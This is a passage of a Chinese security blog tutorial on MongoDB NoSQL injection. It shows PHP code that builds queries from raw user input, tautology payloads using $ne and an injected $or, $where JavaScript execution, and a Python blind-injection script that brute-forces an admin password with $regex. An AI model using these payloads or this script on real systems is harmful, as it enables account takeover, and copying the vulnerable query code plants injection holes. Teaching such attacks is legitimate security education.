+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211110165831951.png" alt="image-20211110165831951"></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+$这是恶意输入 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'$ne'</span> <span class="token operator">=</span><span class="token operator">></span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span>$这是恶意输入<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211110170213507.png" alt="image-20211110170213507"></p>
+<p>所谓永真/重言，就是这样</p>
+<h3 id="永真进阶"><a href="#永真进阶" class="headerlink" title="永真进阶"></a>永真进阶</h3><p>这部分先知社区称为联合查询，但我认为这仍然算是永真，联合查询或许可以达成，但不是这种</p>
+<p>+++</p>
+<p><img src="image-20211111104345099.png" alt="image-20211111104345099"></p>
+<p>+++</p>
+<p>上面是先知的讲解，但这种构造思路只在php7以下起效，php7版本要求查询语句的错误更为明显</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$这是用户输入 <span class="token operator">=</span> <span class="token string">"{\"username\":\""</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"\",\"password\":\""</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">.</span><span class="token string">"\"}"</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>$这是用户输入<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果代码如上所示，很容易产生nosql注入</p>
+<pre class="line-numbers language-payload"><code class="language-payload">username=admin","$or":[{},{"a":"a&password=}],"$comment":"111
+&password=admi
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="image-20211111111409161.png" alt="image-20211111111409161"></p>
+<h2 id="js代码注入"><a href="#js代码注入" class="headerlink" title="js代码注入"></a>js代码注入</h2><p>这里我也不是很熟悉，主要是不会js,所以这里只能简单的写一写原理</p>
+<p>在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.users.find({ $where: "function(){return(this.username == 'whoami')}" })
+{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>使用$where关键字执行js代码，这里相当于执行了<code>db.users.find(&#123;&quot;username&quot;:&quot;whoami&quot;&#125;)</code></p>
+<p>这里几乎可以做到js做的到的所有事情</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p><strong>MongoDB 使用 $regex 操作符来设置匹配字符串的正则表达式。</strong></p>
+<p>MongoDB使用PCRE (Perl Compatible Regular Expression) 作为正则表达式语言。</p>
+<p>语法：</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find({name:{$regex:"mujie"}})
+db.mujie.find({name:/mujie/})
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="image-20211111183622819.png" alt="image-20211111183622819"></p>
+<pre class="line-numbers language-pay;oad"><code class="language-pay;oad">// 判断字符数
+db.mujie.find({username:"Atmujie",password:{$regex:".{1}"}})
+// 注意，$regex只能匹配字符串类型
+
+// 盲注
+db.mujie.find({username:"Atmujie",password:{$regex:"1.{5}"}})
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211111184916911.png" alt="image-20211111184916911"></p>
+<p><img src="image-20211111185037298.png" alt="image-20211111185037298"></p>
+<p>+++</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 简单的盲注脚本，出自先知社区</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+
+password <span class="token operator">=</span> <span class="token string">''</span>
+url <span class="token operator">=</span> <span class="token string">'http://192.168.226.148/index.php'</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> c <span class="token operator">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+
+            <span class="token comment" spellcheck="true"># When the method is GET</span>
+            get_payload <span class="token operator">=</span> <span class="token string">'?username=admin&amp;password[$regex]=^%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true"># When the method is POST</span>
+            post_payload <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+                <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string">'^'</span> <span class="token operator">+</span> password <span class="token operator">+</span> c
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true"># When the method is POST with JSON</span>
+            json_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{"username":"admin", "password":{"$regex":"^%s"}}"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true">#headers = {'Content-Type': 'application/json'}</span>
+            <span class="token comment" spellcheck="true">#r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span>
+
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'Login Success'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                password <span class="token operator">+=</span> c
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>大体道这里就算是完成入门了，剩下的也只有自己找题练习</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Atmujie</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://atmujie.github.io/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">http://atmujie.github.io/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'http://atmujie.github.io/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/';
+        this.page.identifier = '/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/';
+        this.page.title = 'nosql注入浅析';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
+        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/11/08/nosql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="nosql注入浅析">
+                        
+                        <span class="card-title">nosql注入浅析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/11/02/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="菜鸟随笔-PHP裸文件本地包含">
+                        
+                        <span class="card-title">菜鸟随笔-PHP裸文件本地包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-02
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">Web安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
